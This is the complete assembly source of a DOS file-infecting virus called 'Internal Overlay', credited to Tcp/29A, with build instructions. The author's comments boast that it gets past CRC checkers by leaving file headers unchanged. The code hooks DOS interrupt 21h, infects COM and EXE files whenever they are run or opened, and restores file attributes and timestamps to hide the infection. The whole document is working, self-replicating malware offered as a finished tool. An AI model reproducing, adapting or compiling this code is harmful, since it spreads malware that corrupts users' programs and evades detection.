;
;                                             ‹€€€€€‹ ‹€€€€€‹ ‹€€€€€‹
;          Internal Overlay                   €€€ €€€ €€€ €€€ €€€ €€€
;          by Tcp/29A                          ‹‹‹€€ﬂ ﬂ€€€€€€ €€€€€€€
;                                             €€€‹‹‹‹ ‹‹‹‹€€€ €€€ €€€
;                                             €€€€€€€ €€€€€€ﬂ €€€ €€€
;
; Here you have a virus i wrote some time ago... an old but still pretty
; interesting virus (anyway, ain't so old... one year or less :) Its pe-
; culiarity consists in  that it infects COM and EXE files without modi-
; fying  their headers! ;) In this way, it doesn't get  detected under a
; very large number of CRC checkers  which just compare the  first bytes
; and the length of the files whose info it stores.
;
; Internal Overlay (IntOv for friends :) does this by inserting an over-
; lay loader at the entry point of the files it infects, and the corres-
; ponding  overlay -the virus- at the end  of the file, appended to  the
; infected file in the traditional way :)
;
; It infects, as i told  before, COM and EXE files on  execution (4b00h)
; and opening (3dh), and it  doesn't infect COMMAND.COM or EXEs with re-
; location items in the entry point, unless this item is located in off-
; set 7 (PkLited files have an item there) ;)
;
; Compiling instructions:
;
; tasm /m intov.asm
; tlink intov.obj
; exe2bin intov.exe intov.com


assume cs:code,ds:code,ss:code,es:code
org 0
code segment

_BYTES = ((end_vir-start)+(ov_part-start)+15)
_PARAG = _BYTES/16

start:

delta_ofs       equ word ptr $+1
                mov si,100h     ; Delta offset (precalc)
                                ; In dropper, 100h
id_mark         equ word ptr $+1
                mov cx,'<>'     ; Length to search for, it will be the
                                ; id mark: '<>'... why not? :)
reloc_pkl       equ word ptr $+1
                mov bp,0000     ; For PkLite's relocation
                mov es,ds:[2ch] ; es-> environment
                xor ax,ax
                xor di,di
                repnz scasw     ; Search for two consecutive zeros
                                ; Searching file name
                inc di
                inc di          ; es:di -> file name
                push cs
                push ds
                push es
                push di
                push ds

                mov ax,ds
                dec ax
                mov es,ax       ; MCB access
                                ; ES-> MCB
                mov bx,es:[0003]
                sub bx,_PARAG+1
                pop es
                mov ah,4ah
                int 21h         ; Free memory. If resident, doesn't return!
                mov ah,48h
                mov bx,_PARAG
                int 21h         ; Want some memory
                mov es,ax
                push cs
                pop ds

                mov cx,offset(ov_part)
                push si
                xor di,di
                rep movsb       ; Move it to reserved area
                pop si
                mov ax,offset(new_mcb)
                push es
                push ax
                retf            ; Jump to reserved area

new_mcb:
                push ds
                pop es          ; es:= old cs
                pop dx
                pop ds
                mov ax,3d00h
                int 21h         ; Open the file
                xchg bx,ax      ; bx:=handle
                push cs
                pop ds
long_high       equ word ptr $+1
                mov cx,0000
long_low        equ word ptr $+1
                mov dx,offset(ov_part)  ; For the dropper
                mov ax,4200h
                int 21h         ; Get set in file
                                ; Point to 'overlay'
                mov cx,offset(end_vir)
                mov ah,3fh
                mov dx,offset(ov_part)
                int 21h         ; Read the 'overlay'
                mov ah,3eh      ; We're up to here in the Entry Point

;⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø
;≥ Now, the virus overlay part                                          ≥
;¿ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ

ov_part:
                int 21h         ; Close file
                push si
                push si
                pop di
                mov si,offset(original)
                mov cx,offset(ov_part)
                rep movsb       ; Restore original code in memory
                pop si
                push cs
                pop ax
                dec ax
                mov es,ax       ; es-> MCB
                mov word ptr es:[0001],8        ; O.S. block
                mov ax,3521h            ; Get and change int 21h
                int 21h
                mov ofs_int21,bx
                mov seg_int21,es
                mov ah,25h
                mov dx,offset(int_21)
                int 21h
exec_host:
                pop ds          ; PSP
                push si
                xor ax,ax
                xor bx,bx
                xor cx,cx
                xor dx,dx
                xor bp,bp
                xor si,si
                xor di,di
                push ds
                pop es
                retf            ; jump to host

c_com           db 'COM'
                db 'EXE'
                db 'exe'
                db 'com'

c_21:
                pushf
                call dword ptr cs:[ofs_int21]
                ret

int_24:         mov al,3
                iret

                db '[Internal Overlay, Tcp / 29A]'

int_21:
                cmp ah,4ah      ; Can be our call
                jne f_func
                push ax
                push di
                mov ax,'<>'
                sub ax,cx
                shr di,1
                sub ax,di
                inc ax          ; If 0 -> our call
                pop di
                pop ax
                jnz f_func
                pop cx          ; We're not interested in offset
                pop di          ; Interested in code segment
                pop cx          ; We're not interested in flags
                pop dx
                pop ds          ; ds:dx -> file name
                mov ax,3d00h
                call c_21       ; Open file
                xchg ax,bx      ; bx:=handle
                mov ds,di
                mov cx,[si+long_high]   ; Restore data
                mov dx,[si+long_low]
                add dx,offset(original)-offset(ov_part)
                adc cx,0
                mov ax,4200h
                int 21h         ; Postion on overlay's portion that
                                ; keeps original code
                mov dx,si
                mov ah,3fh
                mov cx,offset(ov_part)
                int 21h         ; We read
                mov ah,3eh
                int 21h         ; We close the file
                add [si+1],bp   ; Reallocate Pklite's item (add 0 otherwise)
                jmp exec_host

f_func:
                push bx
                push cx
                push dx
                push bp
                push ds
                push es
                push si
                push di
                push ax
                mov di,dx
                mov al,0
                mov cx,666h     ;-)
                repnz scasb
                sub di,4        ; filename.ext
                                ;          ^
                pop ax
                push ax
                cmp ax,4b00h    ; file execution?
                je is_exec
                cmp ah,3dh      ; open-file?
                je check_ext
end_21:
                pop ax
                pop di
                pop si
                pop es
                pop ds
                pop bp
                pop dx
                pop cx
                pop bx
                db 0eah         ; jmp far
ofs_int21       dw ?
seg_int21       dw ?

check_ext:
                push ds
                push cs
                pop ds
                mov si,offset(c_com)
                mov cx,4
loop_ext:       push si         ; check valid extensions
                push di
                cmpsw
                jne next_ext
                cmpsb
next_ext:       pop di
                pop si
                je ext_ok
                add si,3
                loop loop_ext
                pop ds
                or cx,cx
                jz end_21
ext_ok:         pop ds
is_exec:
                cmp byte ptr ds:[di-2],'D'      ; Don't infect command.com
                jz end_21
                cmp byte ptr ds:[di-2],'d'
                jz end_21
                mov ax,3524h    ; Read and prepare int 24h
                int 21h
                push es
                push bx
                mov ah,25h
                push ax         ; 2524h
                push ds
                push dx
                push cs
                pop ds
                mov dx,offset(int_24)
                int 21h
                pop dx
                pop ds
                mov ax,4300h
                int 21h         ; Get attribs
                push cx
                push ds
                push dx
                xor cx,cx
                mov ax,4301h    ; Reset all attribs
                int 21h
                jb rest_atribs
                mov ax,3d02h
                call c_21       ; Open the file I/O
                push cs
                pop ds
                xchg ax,bx      ; bx:=handle
                mov ax,5700h
                int 21h         ; Get time/date
                push dx
                push cx
                mov ah,3fh
                mov dx,offset(header)
                mov cx,1Ch
                int 21h         ; Read file header
                mov ax,val_ip
                mov delta_ofs,ax
                xchg bp,ax      ; bp:=val_ip
                cmp signature,'ZM'      ; EXE?
                je exe
                                ; Assume it's a com
                cmp byte ptr signature,0e9h     ; jmp?
                jne rest_hour
                mov ax,word ptr signature+1     ; Offset jmp
                add ax,3        ; Calculate file's offset
                mov delta_ofs,ax
                add delta_ofs,100h
                xor dx,dx
                xor cx,cx
                jz exe&com

rest_hour:      mov ax,5701h    ; Restore date/time
                pop cx
                pop dx
                int 21h
                mov ah,3eh      ; We close
                int 21h
rest_atribs:    mov ax,4301h    ; Restore attribs
                pop dx
                pop ds          ; ds:dx -> file name
                pop cx
                int 21h
                pop ax          ; ax:=2524h
                pop dx
                pop ds
                int 21h
                jmp end_21

exe:
                mov ax,header_size
                mov cx,16
                mul cx          ; ax:=header length
                push ax
                mov ax,val_cs
                imul cx
                add ax,bp       ; bp:=val_ip
                adc dx,0        ; dx:ax := cs:ip inside load module
                mov cx,relo_items       ; Number of reallocation items
                jcxz items_ok
                push cx
                push ax
                push dx
                xor cx,cx            ; Get on reallocation table
                mov dx,ofs_reloc
                mov ax,4200h
                int 21h
                pop dx
                pop ax
read_items:
                push ax
                push dx
                mov ah,3fh
                mov dx,offset(original)
                mov cx,20*4     ; Read 20 reallocaci¢n items
                int 21h
                mov si,dx
                mov di,-20*4
                pop dx
                pop ax
process_item:   pop cx
                push bx
                mov bx,[si]
                cmpsw           ; inc si, inc si, inc di, inc di
                mov bp,[si]
                cmpsw           ; inc si, inc si, inc di, inc di

                sub bx,ax
                sbb bp,dx
                jnz next_item
                cmp bx,offset(ov_part)  ; Is it part of code?
                jnbe next_item
                cmp bx,7        ; PkLite's code?
                pop bx
                jnz bad_item
                push bx
next_item:      dec cx
                pop bx
                jcxz items_ok
                or di,di        ; We need read more items?
                push cx
                jnz process_item
                jz read_items
items_ok:
                pop cx          ; cx:= header length
exe&com:        add ax,cx
                adc dx,0        ; dx:ax := cs:ip offset in file
                push ax
                push dx
                mov cx,dx
                xchg ax,dx      ; = mov dx,ax
                mov ax,4200h
                int 21h         ; get on the entry point
                mov ah,3fh
                mov cx,offset(ov_part)
                mov dx,offset(original)
                int 21h         ; Read original code
                sub ax,cx       ; Have enough space?
                jc no_inf
                cmp pages,'<>'  ; Id mark is in offset 4
                stc
                je no_inf
                mov ax,4202h    ; Go to he end of file
                xor cx,cx
                cwd
                int 21h
                mov long_high,dx        ; Save file-offset of code
                mov long_low,ax
                mov ah,40h              ; 'Stick' to the file
                mov cx,offset(end_vir)
                mov dx,offset(ov_part)
                int 21h
no_inf:         pop cx
                pop dx
                jc alr_inf
                mov reloc_pkl,0
                mov ax,4200h
                int 21h         ; Return to cs:ip
                mov ah,40h
                mov cx,offset(ov_part)
                cwd
                int 21h         ; Write new code on entry-point
                push cx
bad_item:       pop cx
alr_inf:        jmp rest_hour

end_vir:

original:
header:
signature       dw 20cdh
image_size      dw ?
pages           dw ?
relo_items      dw ?
header_size     dw ?
mim_mem         dw ?
max_mem         dw ?
stack_seg       dw ?
stack_ofs       dw ?
checksum        dw ?
val_ip          dw ?
val_cs          dw ?
ofs_reloc       dw ?
overlays        dw ?

code ends
        end start

